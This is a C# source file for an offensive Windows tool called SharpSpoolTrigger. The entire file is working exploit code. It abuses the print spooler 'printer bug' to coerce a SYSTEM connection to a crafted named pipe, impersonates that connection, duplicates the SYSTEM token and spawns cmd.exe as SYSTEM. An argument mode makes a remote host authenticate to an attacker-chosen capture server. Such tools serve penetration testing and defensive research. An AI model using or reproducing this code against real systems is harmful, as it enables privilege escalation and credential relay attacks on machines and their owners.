using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using static SharpSpoolTrigger.NativeMethods;


namespace SharpSpoolTrigger
{
    public class Program
    {
        // 
        // misc vars
        //
        public const uint TOKEN_QUERY = 0x0008;
        public const uint TOKEN_DUPLICATE = 0x0002;
        public const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        public const uint TOKEN_ALL_ACCESS = 0xF01FF;
        public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public const uint PIPE_ACCESS_DUPLEX = 0x00000003;
        public const uint PIPE_TYPE_BYTE = 0x00000000;
        public const uint PIPE_READMODE_BYTE = 0x00000000;
        public const uint PIPE_WAIT = 0x00000000;
        public const uint PIPE_UNLIMITED_INSTANCES = 255;
        public const uint FILE_FLAG_OVERLAPPED = 0x40000000;
        public delegate uint ThreadProc(IntPtr lpParameter);


        //
        // structs
        //
        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OVERLAPPED
        {
            public IntPtr Internal;
            public IntPtr InternalHigh;
            public uint Offset;
            public uint OffsetHigh;
            public IntPtr Pointer;

            public IntPtr hEvent;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_DESCRIPTOR
        {
            public byte Revision;
            public byte Sbz1;
            public short Control;
            public IntPtr Owner;
            public IntPtr Group;
            public IntPtr Sacl;
            public IntPtr Dacl;
        }
        public enum TOKEN_INFORMATION_CLASS
        {
            TokenUser = 1,
            TokenGroups = 2,
            TokenPrivileges = 3,
            TokenOwner = 4,
            TokenPrimaryGroup = 5,
            TokenDefaultDacl = 6,
            TokenSource = 7,
            TokenStatistics = 8,
            TokenRestrictedSids = 9,
            TokenSessionId = 10,
            TokenGroupsAndPrivileges = 11,
            TokenSessionReference = 12,
            TokenSandBoxInert = 13,
            TokenAuditPolicy = 14,
            TokenOrigin = 15,
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }


        //
        // advapi32
        //
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        //[DllImport("advapi32.dll", SetLastError = true)]
        //public static extern bool RevertToSelf();

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool LookupPrivilegeName(
            string lpSystemName,
            ref LUID lpLuid,
            StringBuilder lpName,
            ref int cchName);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(
            IntPtr TokenHandle,
            uint TokenInformationClass,
            IntPtr TokenInformation,
            int TokenInformationLength,
            out int ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            uint DesiredAccess,
            out IntPtr TokenHandle);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool InitializeSecurityDescriptor(
            ref SECURITY_DESCRIPTOR pSecurityDescriptor,
            uint dwRevision);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool ConvertStringSecurityDescriptorToSecurityDescriptor(
            string StringSecurityDescriptor,
            int StringSDRevision,
            ref IntPtr SecurityDescriptor,
            out int SecurityDescriptorSize);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool DuplicateTokenEx(
            IntPtr existingTokenHandle,
            uint desiredAccess,
            ref SECURITY_ATTRIBUTES tokenAttributes,
            uint impersonationLevel,
            uint tokenType,
            out IntPtr duplicatedTokenHandle);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool CreateProcessAsUser(
            IntPtr hToken,
            string lpApplicationName,
            string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);


        //
        // kernel32
        //
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentThread();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int GetLastError();

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr CreateNamedPipe(
            string lpName,                           
            uint dwOpenMode,
            uint dwPipeMode,
            uint nMaxInstances,
            uint nOutBufferSize,
            uint nInBufferSize,
            uint dwDefaultTimeOut,
            SECURITY_ATTRIBUTES lpSecurityAttributes);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr CreateThread(
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            uint dwStackSize,
            ThreadProc lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr CreateEvent(
            IntPtr lpEventAttributes,
            bool bManualReset,
            bool bInitialState,
            string lpName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ConnectNamedPipe(
            IntPtr hNamedPipe, 
            ref OVERLAPPED lpOverlapped);

        [DllImport("kernel32.dll")]
        static extern uint GetSystemDirectory(
            [Out] StringBuilder lpBuffer, 
            uint uSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool OpenThreadToken(
            IntPtr threadHandle,
            uint desiredAccess,
            bool openAsSelf,
            out IntPtr tokenHandle);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(
            IntPtr hHandle, 
            uint dwMilliseconds);


        //
        // userenv
        //
        [DllImport("userenv.dll", SetLastError = true)]
        static extern bool CreateEnvironmentBlock(
            out IntPtr lpEnvironment,
            IntPtr hToken,
            bool bInherit);


        //
        // functions
        //
        public static UInt32 TriggerNamedPipeConnectionThread(string pipeName)
        {
            var Rprn = new rprn();
            IntPtr hHandle = IntPtr.Zero;
            DEVMODE_CONTAINER devmodeContainer = new DEVMODE_CONTAINER();

            string computerName = Environment.MachineName;
            Console.WriteLine($"[*] Computer Name: {computerName}");
            string targetServer = $@"\\{computerName}";
            Console.WriteLine($"[*] Target Server: {targetServer}");
            string captureServer = $@"\\{computerName}/pipe/{pipeName}";
            Console.WriteLine($"[*] Capture Server: {captureServer}");
            try
            {
                var ret = Rprn.RpcOpenPrinter(targetServer, out hHandle, null, ref devmodeContainer, 0);
                if (ret != 0)
                {
                    Console.WriteLine($"[-] RpcOpenPrinter: {ret}");
                    return 0;
                }
                Console.WriteLine($"[+] RpcOpenPrinter: {ret}");


                ret = Rprn.RpcRemoteFindFirstPrinterChangeNotificationEx(hHandle, 0x00000100, 0, captureServer, 0);
                Console.WriteLine($"[*] RpcRemoteFindFirstPrinterChangeNotificationEx: {ret}");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
            finally
            {
                if (hHandle != IntPtr.Zero)
                    Rprn.RpcClosePrinter(ref hHandle);
            }
            return 0;
        }


        public static void Main(string[] args)
        {
            //
            // if no args, use printer bug to get interactive system session
            //
            if (args.Length < 2)
            {
                IntPtr hToken;
                bool success = OpenProcessToken(
                    GetCurrentProcess(),
                    TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,
                    out hToken);
                if (!success)
                {
                    Console.WriteLine("[-] OpenProcessToken: FAIL");
                    return;
                }
                Console.WriteLine("[+] OpenProcessToken: SUCCESS");
                Console.WriteLine($"[*] OpenProcessToken: {hToken}");


                int TokenInfLength = 0;
                success = GetTokenInformation(
                    hToken,
                    3,
                    IntPtr.Zero,
                    TokenInfLength,
                    out TokenInfLength);


                IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
                success = GetTokenInformation(
                    hToken,
                    3,
                    TokenInformation,
                    TokenInfLength,
                    out TokenInfLength);
                if (!success)
                {
                    Console.WriteLine("[-] GetTokenInformation: FAIL");
                    return;
                }
                Console.WriteLine("[+] GetTokenInformation: SUCCESS");
                Console.WriteLine($"[*] GetTokenInformation: {TokenInformation}");


                //
                // look for seimpersonate
                string impersonatePriv = "SeImpersonatePrivilege";
                int count = Marshal.ReadInt32(TokenInformation);
                IntPtr luidPtr = IntPtr.Add(TokenInformation, 4); // skip PrivilegeCount (4 bytes)
                for (int i = 0; i < count; i++)
                {
                    LUID_AND_ATTRIBUTES laa = Marshal.PtrToStructure<LUID_AND_ATTRIBUTES>(luidPtr);

                    StringBuilder name = new StringBuilder(256);
                    int nameLen = name.Capacity;

                    if (LookupPrivilegeName(null, ref laa.Luid, name, ref nameLen))
                    {
                        if (name.ToString().Equals(impersonatePriv))
                        {
                            Console.WriteLine($"[+] SeImpersonatePrivilege: FOUND");
                            if ((laa.Attributes & 0x2) != 0)
                            {
                                Console.WriteLine("[+] SeImpersonatePrivilege: ENABLED");
                            }
                            else
                            {
                                Console.WriteLine("[-] SeImpersonatePrivilege: NOT ENABLED");
                            }
                            break;
                        }
                    }
                    luidPtr = IntPtr.Add(luidPtr, Marshal.SizeOf<LUID_AND_ATTRIBUTES>());
                }
                Marshal.FreeHGlobal(TokenInformation);


                //
                // TODO: part to enable the priv if its disabled
                //

                //
                // create random pipe with random guid name
                //
                Guid newGuid = Guid.NewGuid();
                string pipeName = newGuid.ToString();
                string fullPipeName = $@"\\.\pipe\{pipeName}\pipe\spoolss";
                Console.WriteLine($"[+] Pipe Name: {fullPipeName}");


                SECURITY_DESCRIPTOR sd = new SECURITY_DESCRIPTOR();
                SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
                success = InitializeSecurityDescriptor(ref sd, 1);
                if (!success)
                {
                    Console.WriteLine($"[-] InitializeSecurityDescriptor: FAIL");
                    return;
                }
                Console.WriteLine($"[+] InitializeSecurityDescriptor: SUCCESS");


                int securityDescriptorSize = 0;
                IntPtr lpSecurityDescriptor = IntPtr.Zero;
                string stringSecurityDescriptor = "D:(A;OICI;GA;;;WD)";
                success = ConvertStringSecurityDescriptorToSecurityDescriptor(
                    stringSecurityDescriptor,
                    1,
                    ref lpSecurityDescriptor,
                    out securityDescriptorSize);
                if (!success)
                {
                    Console.WriteLine($"[-] ConvertStringSecurityDescriptorToSecurityDescriptor: FAIL");
                    return;
                }
                Console.WriteLine($"[+] ConvertStringSecurityDescriptorToSecurityDescriptor: SUCCESS");


                IntPtr hPipe = CreateNamedPipe(
                    fullPipeName,
                    PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
                    PIPE_TYPE_BYTE | PIPE_WAIT,
                    10,
                    2048,
                    2048,
                    0,
                    sa);
                Console.WriteLine($"[+] Pipe Handle: {hPipe}");

                OVERLAPPED ol = new OVERLAPPED();
                IntPtr hPipeEvent = CreateEvent(
                    IntPtr.Zero,
                    true,
                    false,
                    null);

                ol.hEvent = hPipeEvent;
                success = ConnectNamedPipe(
                    hPipe,
                    ref ol);
                if (GetLastError() != 997)
                {
                    Console.WriteLine($"[-] ConnectNamedPipe: {GetLastError()}");
                    return;
                }
                Console.WriteLine($"[+] ConnectNamedPipe: SUCCESS");

                Thread thread = new Thread(() => TriggerNamedPipeConnectionThread(pipeName));
                thread.Start();
                // allow some time for magic
                Thread.Sleep(5000);
                thread.Join();
                success = ImpersonateNamedPipeClient(hPipe);
                Console.WriteLine($"[+] ImpersonateNamedPipeClient: SUCCESS");


                IntPtr hSystemToken = IntPtr.Zero;
                IntPtr hSystemTokenDup = IntPtr.Zero;
                success = OpenThreadToken(
                    GetCurrentThread(),
                    TOKEN_ALL_ACCESS,
                    false,
                    out hSystemToken);
                if (!success)
                {
                    Console.WriteLine($"[-] OpenThreadToken: FAIL");
                    return;
                }
                Console.WriteLine($"[+] OpenThreadToken: SUCCESS");

                SECURITY_ATTRIBUTES dupsa = new SECURITY_ATTRIBUTES();
                success = DuplicateTokenEx(
                    hSystemToken,
                    TOKEN_ALL_ACCESS,
                    ref dupsa,
                    2,
                    1,
                    out hSystemTokenDup);
                if (!success)
                {
                    Console.WriteLine($"[-] DuplicateTokenEx: FAIL");
                    return;
                }
                Console.WriteLine($"[+] DuplicateTokenEx: SUCCESS");

                success = ImpersonateLoggedOnUser(hSystemTokenDup);
                if (!success)
                {
                    Console.WriteLine("[-] ImpersonateLoggedOnUser: FAIL");
                    return;
                }
                Console.WriteLine("[+] ImpersonateLoggedOnUser: SUCCESS");
                StringBuilder sbSystemDir = new StringBuilder(256);
                uint res1 = GetSystemDirectory(sbSystemDir, 256);
                IntPtr env = IntPtr.Zero;
                bool res = CreateEnvironmentBlock(out env, hSystemTokenDup, false);

                String impname = WindowsIdentity.GetCurrent().Name;
                Console.WriteLine("[*] Impersonated User: " + impname);

                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                si.lpDesktop = "WinSta0\\Default";

                const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
                SECURITY_ATTRIBUTES saProcess = new SECURITY_ATTRIBUTES();
                SECURITY_ATTRIBUTES saThread = new SECURITY_ATTRIBUTES();
                success = CreateProcessAsUser(
                    hSystemTokenDup,
                    null,
                    "C:\\Windows\\System32\\cmd.exe",
                    ref saProcess,
                    ref saThread,
                    true,
                    CREATE_UNICODE_ENVIRONMENT,
                    env,
                    sbSystemDir.ToString(),
                    ref si,
                    out pi);

                WaitForSingleObject(pi.hProcess, 0xFFFFFF);
            }
            else
            {
                var Rprn = new rprn();
                IntPtr hHandle = IntPtr.Zero;
                var devmodeContainer = new DEVMODE_CONTAINER();
                Console.WriteLine($"[*] Target: {args[0]}");
                Console.WriteLine($"[*] Capture: {args[1]}");
                try
                {
                    var ret = Rprn.RpcOpenPrinter("\\\\" + args[0], out hHandle, null, ref devmodeContainer, 0);
                    if (ret != 0)
                    {
                        Console.WriteLine($"[-] RpcOpenPrinter status: {ret}");
                        return;
                    }
                    ret = Rprn.RpcRemoteFindFirstPrinterChangeNotificationEx(hHandle, 0x00000100, 0, "\\\\" + args[1], 0);
                    if (ret != 0)
                    {
                        Console.WriteLine($"[-] RpcRemoteFindFirstPrinterChangeNotificationEx status: {ret}");
                        return;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                }
                finally
                {
                    if (hHandle != IntPtr.Zero)
                        Rprn.RpcClosePrinter(ref hHandle);
                }
            }
        }
    }
}